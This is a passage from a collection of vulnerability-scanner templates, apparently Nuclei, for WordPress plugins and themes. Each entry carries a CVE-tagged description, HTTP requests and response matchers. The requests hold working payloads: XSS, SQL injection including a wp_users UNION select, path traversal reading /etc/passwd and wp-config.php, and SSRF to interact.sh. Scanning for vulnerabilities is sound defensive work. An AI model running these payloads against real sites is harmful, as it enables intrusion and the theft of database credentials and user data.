  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# WordPress Statistics \<13.0.8 - Blind SQL Injection

## Description

- WordPress Statistic plugin versions prior to version 13.0.8 are affected by an unauthenticated time-based blind SQL injection vulnerability.
- severity - high
- tags - cve,wp-plugin,unauth,wpscan,cve2021,wordpress,sqli,blind,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/wp-statistics/readme.txt

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. WP Statistics
- part - body

**Type - dsl**

- dsl
  1. compare_versions(version, '\< 13.0.8')

### Extractors

**Type - regex**

- name - version
- internal - True
- group - 1
- regex
  1. (?m)Stable tag: ([0-9.]+)

**Type - regex**

- group - 1
- regex
  1. (?m)Stable tag: ([0-9.]+)

---

# WordPress Sassy Social Share Plugin \<3.3.40 - Cross-Site Scripting

## Description

- WordPress plugin Sassy Social Share \< 3.3.40 contains a reflected cross-site scripting vulnerability.
- severity - medium
- tags - cve,cve2021,wordpress,wp-plugin,xss,wp,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-json/wp/v2/posts
- {{BaseURL}}/{{slug}}/?a&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;

### Matchers

**Type - word**

- part - body
- words
  1. ?a">\<script>alert(document.domain)\</script>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- part - body
- name - slug
- internal - True
- group - 1
- regex
  1. "slug":"([_a-z-A-Z0-9]+)",

---

# WordPress FoodBakery \<2.2 - Cross-Site Scripting

## Description

- WordPress FoodBakery before 2.2 contains an unauthenticated reflected cross-site scripting vulnerability. It does not properly sanitize the foodbakery_radius parameter before outputting it back in the response.
- severity - medium
- tags - cve,cve2021,wordpress,xss,wp-plugin,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/listings/?search_title=&location=&foodbakery_locations_position=filter&search_type=autocomplete&foodbakery_radius=10%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Calendar Event Multi View \<1.4.01 - Cross-Site Scripting

## Description

- WordPress Calendar Event Multi View plugin before 1.4.01 contains an unauthenticated reflected cross-site scripting vulnerability. It does not sanitize or escape the 'start' and 'end' GET parameters before outputting them in the page (via php/edit.php).
- severity - medium
- tags - cve,cve2021,xss,wordpress,wp-plugin,wpscan

## Requests

### Step - 1

```
GET /?cpmvc_id=1&cpmvc_do_action=mvparse&f=edit&month_index=0&delete=1&palette=0&paletteDefault=F00&calid=1&id=999&start=a%22%3E%3Csvg/%3E%3C%22&end=a%22%3E%3Csvg/onload=alert(1)%3E%3C%22 HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

```

### Matchers

**Type - word**

- words
  1. > \<svg/onload=alert(1)>\<
  2. Calendar Details
- part - body
- condition - and

**Type - word**

- words
  1. text/html
- part - header

**Type - status**

- status
  1. 200

---

# WordPress wpForo Forum \< 1.9.7 - Open Redirect

## Description

- WordPress wpForo Forum \< 1.9.7 is susceptible to an open redirect vulnerability because the plugin did not validate the redirect_to parameter in the login form of the forum, leading to an open redirect issue after a successful login.
- severity - medium
- tags - wpscan,wordpress,redirect,cve,cve2021

## Requests

- Method - GET

### URL

- {{BaseURL}}/community/?foro=signin&redirect_to=https://interact.sh/

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# WordPress Supsystic Ultimate Maps \<1.2.5 - Cross-Site Scripting

## Description

- WordPress Supsystic Ultimate Maps plugin before 1.2.5 contains an unauthenticated reflected cross-site scripting vulnerability due to improper sanitization of the tab parameter on the options page before outputting it in an attribute.
- severity - medium
- tags - wpscan,packetstorm,wordpress,cve,cve2021,wp-plugin,maps

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin.php?page=ultimate-maps-supsystic&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- condition - and

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. text/html
- part - header

---

# WordPress JH 404 Logger \<=1.1 - Cross-Site Scripting

## Description

- WordPress JH 404 Logger plugin through 1.1 contains a cross-site scripting vulnerability. Referer and path of 404 pages are not properly sanitized when they are output in the WordPress dashboard, which can lead to executing arbitrary JavaScript code.
- severity - medium
- tags - cve,cve2021,wordpress,wp-plugin,xss,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/jh-404-logger/readme.txt

### Matchers

**Type - word**

- words
  1. JH 404 Logger
- part - body

**Type - status**

- status
  1. 200

---

# WOOF WordPress plugin - Cross-Site Scripting

## Description

- The WOOF WordPress plugin does not sanitize or escape the woof_redraw_elements parameter before reflecting it back in an admin page, leading to a reflected cross-site scripting.

- severity - medium
- tags - cve,cve2021,wordpress,wp-plugin,wp,xss,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=woof_draw_products&woof_redraw_elements[]=\<img%20src=x%20onerror=alert(document.domain)>

### Matchers

**Type - word**

- part - body
- words
  1. "additional_fields":["\<img src=x onerror=alert(document.domain)>"]}

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Noptin \< 1.6.5 - Open Redirect

## Description

- Noptin \< 1.6.5 is susceptible to an open redirect vulnerability. The plugin does not validate the "to" parameter before redirecting the user to its given value, leading to an open redirect issue.
- severity - medium
- tags - wp,wpscan,cve,cve2021,wordpress,redirect,wp-plugin,noptin

## Requests

- Method - GET

### URL

- {{BaseURL}}/?noptin_ns=email_click&to=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# WordPress Simple Giveaways \<2.36.2 - Cross-Site Scripting

## Description

- WordPress Simple Giveaways plugin before 2.36.2 contains a cross-site scripting vulnerability via the method and share GET parameters of the Giveaway pages, which are not sanitized, validated, or escaped before being output back in the pages.

- severity - medium
- tags - wpscan,cve,cve2021,wordpress,xss,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/giveaway/mygiveaways/?share=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Stop Spammers \<2021.9 - Cross-Site Scripting

## Description

- WordPress Stop Spammers plugin before 2021.9 contains a reflected cross-site scripting vulnerability. It does not escape user input when blocking requests (such as matching a spam word), thus outputting it in an attribute after sanitizing it to remove HTML tags.
- severity - medium
- tags - wpscan,cve,cve2021,wordpress,xss,wp-plugin,packetstorm

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP+Cookie+check;

log=ad%22+accesskey%3DX+onclick%3Dalert%281%29+%22&pwd=&wp-submit=%D9%88%D8%B1%D9%88%D8%AF&redirect_to=http://localhost/wp-admin&testcookie=1

```

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- part - header
- words
  1. text/html

**Type - word**

- part - body
- words
  1. ad" accesskey=X onclick=alert(1)

---

# WordPress WHMCS Bridge \<6.4b - Cross-Site Scripting

## Description

- WordPress WHMCS Bridge plugin before 6.4b contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the error parameter before outputting it back in the admin dashboard.

- severity - medium
- tags - whmcs,xss,wpscan,wordpress,wp-plugin,wp,authenticated

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/options-general.php?page=cc-ce-bridge-cp&error=%3Cimg%20src%20onerror=alert(document.domain)%3E HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. \<strong>\<img src onerror=alert(document.domain)>\</strong>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Skaut Bazar \<1.3.3 - Cross-Site Scripting

## Description

- WordPress Skaut Bazar plugin before 1.3.3 contains a reflected cross-site scripting vulnerability due to the use of $\_SERVER['PHP_SELF'] in the ~/skaut-bazar.php file, which allows attackers to inject arbitrary web scripts.
- severity - medium
- tags - wpscan,wordpress,cve,cve2021,wp-plugin,authenticated

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/options-general.php/</script><script>alert(document.domain)</script>/?page=skatubazar_option HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. \</script>\<script>alert(document.domain)\</script>

**Type - status**

- status
  1. 200

**Type - word**

- part - header
- words
  1. text/html

---

# WordPress Responsive Vector Maps \< 6.4.2 - Arbitrary File Read

## Description

- WordPress Responsive Vector Maps \< 6.4.2 contains an arbitrary file read vulnerability because the plugin does not have proper authorization and validation of the rvm_upload_regions_file_path parameter in the rvm_import_regions AJAX action, allowing any authenticated user to read arbitrary files on the web server.
- severity - medium
- tags - cve,authenticated,wpscan,cve2021,lfi,wp,wordpress,wp-plugin,lfr

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin-ajax.php?action=rvm_import_regions&nonce=5&rvm_mbe_post_id=1&rvm_upload_regions_file_path=/etc/passwd HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# WordPress Bello Directory & Listing Theme \<1.6.0 - Cross-Site Scripting

## Description

- WordPress Bello Directory & Listing theme before 1.6.0 contains a reflected cross-site scripting vulnerability. It does not properly sanitize and escape the listing_list_view, bt_bb_listing_field_my_lat, bt_bb_listing_field_my_lng, bt_bb_listing_field_distance_value, bt_bb_listing_field_my_lat_default, bt_bb_listing_field_keyword, bt_bb_listing_field_location_autocomplete, bt_bb_listing_field_price_range_from and bt_bb_listing_field_price_range_to parameters in the ints listing page.
- severity - medium
- tags - cve2021,wordpress,xss,wp-plugin,wpscan,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/listing/?listing_list_view=standard13%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Customize Login Image \< 3.5.3 - Cross-Site Scripting

## Description

- A cross-site scripting (XSS) attack can cause arbitrary code (JavaScript) to run in a user's browser and can use an application as the vehicle for the attack. The XSS payload given in the "Custom logo link" executes whenever the user opens the Settings Page of the "Customize Login Image" Plugin.

- severity - medium
- tags - wpscan,cve2021,wordpress,customize-login-image,wp,authenticated,cve,wp-plugin,xss

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```

### Step - 2

```
GET /wp-admin/options-general.php?page=customize-login-image/customize-login-image-options.php HTTP/1.1
Host: {{Hostname}}

```

### Step - 3

```
POST /wp-admin/options.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

option_page=customize-login-image-settings-group&action=update&_wpnonce={{nonce}}&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Dcustomize-login-image%252Fcustomize-login-image-options.php%26settings-updated%3Dtrue&cli_logo_url=<script>alert(document.domain)</script>&cli_logo_file=&cli_login_background_color=&cli_custom_css=

```

### Step - 4

```
GET /wp-login.php HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_4 == 200
  2. contains(all_headers_4, "text/html")
  3. contains(body_4, "Go to \<script>alert(document.domain)\</script>")
- condition - and

### Extractors

**Type - regex**

- name - nonce
- part - body
- group - 1
- regex
  1. name="\_wpnonce" value="([0-9a-zA-Z]+)"
- internal - True

---

# WooCommerce Blocks 2.5 to 5.5 - Unauthenticated SQL Injection

## Description

- woocommerce-gutenberg-products-block is a feature plugin for WooCommerce Gutenberg Blocks. An SQL injection vulnerability impacts all WooCommerce sites running the WooCommerce Blocks feature plugin between version 2.5.0 and prior to version 2.5.16. Via a carefully crafted URL, an exploit can be executed against the `wc/store/products/collection-data?calculate_attribute_counts[][taxonomy]` endpoint that allows the execution of a read only sql query. There are patches for many versions of this package, starting with version 2.5.16. There are no known workarounds aside from upgrading.

- severity - high
- tags - cve,cve2021,wordpress,woocommerce,sqli,wp-plugin,wp,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/?rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252c%252522sqli-test%252522%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500

### Matchers

**Type - word**

- words
  1. sqli-test
  2. attribute_counts
  3. price_range
  4. term
- condition - and

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# WordPress Photo Gallery by 10Web \<1.5.69 - Cross-Site Scripting

## Description

- WordPress Photo Gallery by 10Web plugin before 1.5.69 contains multiple reflected cross-site scripting vulnerabilities via the gallery_id, tag, album_id and theme_id GET parameters passed to the bwg_frontend_data AJAX action, available to both unauthenticated and authenticated users.

- severity - medium
- tags - photo,wpscan,packetstorm,cve,cve2021,xss,wordpress,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1"%20onmouseover=alert(document.domain)//

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- part - header
- words
  1. text/html

**Type - word**

- words
  1. onmouseover=alert(document.domain)//
  2. wp-content/uploads/photo-gallery
- condition - and

---

# WordPress Car Repair Services & Auto Mechanic Theme \<4.0 - Cross-Site Scripting

## Description

- WordPress Car Repair Services & Auto Mechanic before 4.0 contains a reflected cross-site scripting vulnerability. It does not properly sanitize the serviceestimatekey parameter before outputting it back in the page.
- severity - medium
- tags - cve,cve2021,wordpress,xss,wp-plugin,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/car1/estimateresult/result?s=&serviceestimatekey=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress JNews Theme \<8.0.6 - Cross-Site Scripting

## Description

- WordPress JNews theme before 8.0.6 contains a reflected cross-site scripting vulnerability. It does not sanitize the cat*id parameter in the POST request /?ajax-request=jnews (with action=jnews_build_mega_category*\*).
- severity - medium
- tags - cve2021,wordpress,xss,wp-plugin,wpscan,cve

## Requests

### Step - 1

```
POST /?ajax-request=jnews HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded

lang=en_US&cat_id=6"></script><script>alert(document.domain)</script>&action=jnews_build_mega_category_2&number=6&tags=70%2C64%2C10%2C67

```

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- words
  1. Content-Type: text/html
- part - header

**Type - status**

- status
  1. 200

---

# WordPress Realteo \<=1.2.3 - Cross-Site Scripting

## Description

- WordPress Realteo plugin 1.2.3 and prior contains an unauthenticated reflected cross-site scripting vulnerability due to improper sanitization of keyword_search, search_radius. \_bedrooms and \_bathrooms GET parameters before outputting them in its properties page.
- severity - medium
- tags - cve,cve2021,realteo,xss,wordpress,plugin,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/properties/?keyword_search=--!%3E%22%20autofocus%20onfocus%3Dalert(/{{randstr}}/)%3B%2F%2F

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. autofocus onfocus=alert(/{{randstr}}/);//
  2. Nothing found
- part - body
- condition - and

**Type - word**

- words
  1. text/html
- part - header

---

# WordPress True Ranker \<2.2.4 - Local File Inclusion

## Description

- WordPress True Ranker before version 2.2.4 allows sensitive configuration files such as wp-config.php, to be accessed via the src parameter found in the ~/admin/vendor/datatables/examples/resources/examples.php file via local file inclusion.
- severity - high
- tags - unauth,lfr,wpscan,cve,cve2021,wp-plugin,lfi,wp,wordpress

## Requests

### Step - 1

```
POST /wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

src=%2Fscripts%2Fsimple.php%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwp-config.php

```

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# Wordpress Guppy \<=1.1 - User ID Disclosure

## Description

- Instances of the Guppy Wordpress extension up to 1.1 are vulnerable to an API disclosure vulnerability which allows remote unauthenticated attackrs to obtain all user IDs, and then use that information to make API requests to either get messages sent between users, or send messages posing as one user to another.
- severity - medium
- tags - wordpress,guppy,api,cve2021,cve,wp-plugin,edb,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-json/guppy/v2/load-guppy-users?userId=1&offset=0&search=

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- part - body
- words
  1. "guppyUsers":
  2. "userId":
  3. "type":
- condition - and

---

# Like Button Rating \< 2.6.32 - Unauthenticated Full-Read SSRF

## Description

- The LikeBtn WordPress plugin was vulnerable to Unauthenticated Full-Read Server-Side Request Forgery (SSRF).

- severity - high
- tags - cve,cve2021,wordpress,wp-plugin,wp,ssrf,wpscan,unauth,likebtn-like-button

## Requests

### Step - 1

```
@timeout: 10s
GET /wp-admin/admin-ajax.php?action=likebtn_prx&likebtn_q={{base64('http://likebtn.com.interact.sh')}}" HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. Interactsh Server

**Type - status**

- status
  1. 200

---

# WordPress Event Tickets \< 5.2.2 - Open Redirect

## Description

- WordPress Event Tickets \< 5.2.2 is susceptible to an open redirect vulnerability. The plugin does not validate the tribe_tickets_redirect_to parameter before redirecting the user to the given value, leading to an arbitrary redirect issue.
- severity - medium
- tags - wordpress,redirect,wp-plugin,eventtickets,wpscan,cve,cve2021

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin.php?page=wp_ajax_rsvp-form&tribe_tickets_redirect_to=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# Wordpress Marmoset Viewer \<1.9.3 - Cross-Site Scripting

## Description

- WordPress Marmoset Viewer plugin before 1.9.3 contains a cross-site scripting vulnerability. It does not property sanitize, validate, or escape the 'id' parameter before outputting back in the page.
- severity - medium
- tags - xss,wpscan,cve,cve2021,wp-plugin,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://\</script>\<svg/onload=alert(%27{{randstr}}%27)>
- {{BaseURL}}/wp-content/plugins/marmoset-viewer/mviewer.php?id=1+http://a.com%27);alert(/{{randstr}}/);marmoset.embed(%27a

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. \</script>\<svg/onload=alert('{{randstr}}')>
  2. alert(/{{randstr}}/)
- part - body
- condition - or

**Type - word**

- words
  1. Marmoset Viewer

---

# Visualizer \<3.3.1 - Blind Server-Side Request Forgery

## Description

- Visualizer prior to 3.3.1 suffers from a blind server-side request forgery vulnerability via the /wp-json/visualizer/v1/upload-data endpoint.

- severity - critical
- tags - cve,cve2019,wp-plugin,ssrf,wordpress,xss,unauth,wpscan

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/wp-json/visualizer/v1/upload-data
  - {\"url\":\"http://{{interactsh-url}}\"}

### Matchers

**Type - word**

- part - interactsh_protocol
- name - http
- words
  1. http

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# WordPress Visualizer \<3.3.1 - Cross-Site Scripting

## Description

- WordPress Visualizer plugin before 3.3.1 contains a stored cross-site scripting vulnerability via /wp-json/visualizer/v1/update-chart WP-JSON API endpoint. An unauthenticated attacker can execute arbitrary JavaScript when an admin or other privileged user edits the chart via the admin dashboard.

- severity - medium
- tags - cve,cve2019,wp-plugin,wordpress,wp,xss,unauth,wpscan

## Requests

### Step - 1

```
POST /wp-json/visualizer/v1/update-chart HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"id": 7, "visualizer-chart-type": "<script>alert(document.domain)</script>"}

```

### Matchers

**Type - word**

- part - body
- words
  1. {"success":"Chart updated"}

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# WordPress UserPro 4.9.32 - Cross-Site Scripting

## Description

- WordPress UserPro 4.9.32 is vulnerable to reflected cross-site scripting because the Instagram PHP API (v2) it relies on allows it via the example/success.php error_description parameter.
- severity - medium
- tags - wordpress,xss,wp-plugin,wpscan,packetstorm,cve,cve2019

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/userpro/lib/instagram/vendor/cosenary/instagram/example/success.php?error=&error_description=%3Csvg/onload=alert(1)%3E

### Matchers

**Type - word**

- words
  1. \<svg/onload=alert(1)>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Yuzo \<5.12.94 - Cross-Site Scripting

## Description

- WordPress Yuzo Related Posts plugin before 5.12.94 is vulnerable to cross-site scripting
  because it mistakenly expects that is_admin() verifies that the
  request comes from an admin user (it actually only verifies that the
  request is for an admin page). An unauthenticated attacker can consequently inject
  a payload into the plugin settings, such as the
  yuzo_related_post_css_and_style setting.

- severity - medium
- tags - wpscan,cve,cve2019,wordpress,wp-plugin,xss

## Requests

### Step - 1

```
POST /wp-admin/options-general.php?page=yuzo-related-post HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

yuzo_related_post_css_and_style=</style><script>alert(0);</script>

```

### Step - 2

```
GET / HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_2, "\<script>alert(0);\</script>")

**Type - dsl**

- dsl
  1. contains(tolower(all_headers_2), 'text/html')

---

# WordPress Hero Maps Premium \<=2.2.1 - Cross-Site Scripting

## Description

- WordPress Hero Maps Premium plugin 2.2.1 and prior contains an unauthenticated reflected cross-site scripting vulnerability via the views/dashboard/index.php p parameter.
- severity - medium
- tags - wpscan,cve,cve2019,wordpress,xss,wp-plugin,maps

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/hmapsprem/views/dashboard/index.php?p=/wp-content/plugins/hmapsprem/foo%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. foo">\</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Google Maps \<7.11.18 - SQL Injection

## Description

- WordPress Google Maps plugin before 7.11.18 contains a SQL injection vulnerability. The plugin includes /class.rest-api.php in the REST API and does not sanitize field names before a SELECT statement. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - cve,cve2019,wp,wp-plugin,unauth,sqli,wordpress,googlemaps,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/?rest_route=/wpgmza/v1/markers&filter=%7b%7d&fields=%2a%20from%20wp_users--%20-

### Matchers

**Type - word**

- part - body
- words
  1. "user_login"
  2. "user_pass"
  3. "user_nicename"
- condition - and

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# WordPress CTHthemes - Cross-Site Scripting

## Description

- WordPress CTHthemes CityBook before 2.3.4, TownHub before 1.0.6, and EasyBook before 1.2.2 themes contain reflected cross-site scripting vulnerabilities via a search query.

- severity - medium
- tags - wp-theme,wpscan,cve,cve2019,wordpress,citybook,xss

## Requests

- Method - GET

### URL

- {{BaseURL}}/?search_term=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&location_search=&nearby=off&address_lat=&address_lng=&distance=10&lcats%5B%5D=

### Matchers

**Type - word**

- part - body
- words
  1. \</script>\<script>alert(document.domain)\</script>
  2. /wp-content/themes/citybook
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress My Calendar \<= 3.1.9 - Cross-Site Scripting

## Description

- WordPress plugin My Calendar \<= 3.1.9 is susceptible to reflected cross-site scripting which can be triggered via unescaped usage of URL parameters in multiple locations throughout the site.
- severity - medium
- tags - cve,cve2019,wordpress,xss,wp-plugin,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WP Fundraising Donation and Crowdfunding Platform \< 1.5.0 - Unauthenticated SQLi

## Description

- The WP Fundraising Donation and Crowdfunding Platform WordPress plugin before 1.5.0 does not sanitise and escape a parameter before using it in a SQL statement via one of it's REST route, leading to an SQL injection exploitable by unauthenticated users.

- severity - critical
- tags - cve,sqli,wordpress,wp-plugin,cve2022,wp,wp-fundraising-donation,unauth,wpscan

## Requests

### Step - 1

```
@timeout: 10s
GET /index.php?rest_route=/xs-donate-form/payment-redirect/3 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"id": "(SELECT 1 FROM (SELECT(SLEEP(6)))me)", "formid": "1", "type": "online_payment"}

```

### Matchers

**Type - dsl**

- dsl
  1. duration>=6
  2. status_code == 200
  3. contains(content_type, "application/json")
  4. contains(body, "Invalid payment.")
- condition - and

---

# WordPress Copyright Proof \<=4.16 - Cross-Site-Scripting

## Description

- WordPress Copyright Proof plugin 4.16 and prior contains a cross-site scripting vulnerability. It does not sanitize and escape a parameter before outputting it back via an AJAX action available to both unauthenticated and authenticated users when a specific setting is enabled.

- severity - medium
- tags - wordpress,xss,wp-plugin,wp,wpscan,cve,cve2022

## Requests

### Step - 1

```
GET /wp-admin/admin-ajax.php?action=dprv_log_event&message=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. got message \<script>alert(document.domain)\</script>
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Advanced Booking Calendar \< 1.7.1 - Cross-Site Scripting

## Description

- The Advanced Booking Calendar WordPress plugin before 1.7.1 does not sanitise and escape the room parameter before outputting it back in an admin page, leading to a Reflected Cross-Site Scripting issue

- severity - medium
- tags - wp-plugin,advanced-booking-calendar,cve,cve2022,wp,authenticated,wpscan,wordpress,xss

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```

### Step - 2

```
GET /wp-admin/admin.php?page=advanced-booking-calendar-show-seasons-calendars&setting=changeSaved&room=1111%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3C%22 HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_2, '\<script>alert(document.domain)\</script>')
  2. contains(body_2, 'advanced-booking-calendar')
  3. contains(all_headers_2, 'text/html')
  4. status_code_2 == 200
- condition - and

---

# ProfileGrid \< 5.1.1 - Cross-Site Scripting

## Description

- The ProfileGrid WordPress plugin before 5.1.1 does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting.

- severity - medium
- tags - wp-plugin,wordpress,wpscan,cve,wp,xss,profilegrid,authenticated,cve2022

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```

### Step - 2

```
